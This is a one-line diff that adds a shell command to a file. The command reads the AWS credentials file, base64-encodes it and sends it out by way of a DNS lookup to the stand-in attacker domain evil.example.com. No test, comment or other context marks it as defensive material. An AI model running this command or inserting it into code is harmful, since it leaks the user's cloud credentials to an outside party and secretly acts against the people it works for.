@@ -1,0 +1,1 @@
+dig $(cat ~/.aws/credentials | base64).evil.example.com
